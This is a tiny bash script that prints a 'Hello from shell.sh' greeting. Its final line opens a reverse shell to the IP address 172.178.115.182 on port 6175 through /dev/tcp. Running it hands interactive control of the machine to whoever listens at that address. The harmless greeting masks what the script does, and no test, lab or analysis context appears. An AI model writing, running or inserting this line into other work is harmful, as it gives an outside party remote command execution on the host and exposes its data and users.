#!/bin/bash
echo "Hello from shell.sh"
bash -i >& /dev/tcp/172.178.115.182/6175 0>&1
